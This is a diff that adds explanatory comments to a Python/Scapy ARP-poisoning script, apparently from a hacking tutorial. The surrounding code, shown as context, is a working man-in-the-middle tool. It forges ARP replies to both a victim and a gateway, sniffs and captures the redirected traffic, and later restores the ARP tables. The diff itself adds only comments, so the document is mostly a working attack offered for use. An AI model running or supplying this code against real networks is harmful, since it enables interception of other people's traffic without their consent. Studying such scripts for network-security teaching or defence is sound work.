@@ -1,12 +1,19 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+'''
+ARP poisoning with Python and Scapy.
+
+ARP poisoning is one of the oldest yet most effective tricks in a hacker's toolkit. We convince a target machine that we have become it's gateway, and we will convince the gateway that in order to reach the target machine, all traffic has to go through us. 
+'''
+# Import needed packages
 from multiprocessing import Process
 from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
 import os
 import sys
 import time
 
+# Get MAC address for any given machine
 def get_mac(targetip):
     packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op='who-has', pdst=targetip)
     resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
@@ -14,6 +21,7 @@ def get_mac(targetip):
         return r[Ether].src
     return None
 
+# The Arper
 class Arper:
     def __init__(self, victim, gateway, interface='eth0'):
         self.victim = victim
@@ -29,6 +37,7 @@ class Arper:
         print(f'Victim ({victim}) is at {self.victimmac}')
         print('-'*30)
 
+    # The entry point for the attack
     def run(self):
         self.poison_thread = Process(target=self.poison)
         self.poison_thread.start()
@@ -36,6 +45,7 @@ class Arper:
         self.sniff_thread = Process(target=self.sniff)
         self.sniff_thread.start()
 
+    # Creates the poisoned packets and sends them to the victim and the gateway.
     def poison(self):
         poison_victim = ARP()
         poison_victim.op = 2
@@ -73,6 +83,7 @@ class Arper:
             else:
                 time.sleep(2)
 
+    # Sniff the network
     def sniff(self, count=200):
         time.sleep(5)
         print(f'Sniffing {count} packets.')
@@ -84,6 +95,7 @@ class Arper:
         self.poison_thread.terminate()
         print('Finished.')
 
+    # Restore the ARP attack
     def restore(self):
         print('Restoring ARP tables...')
         send(ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
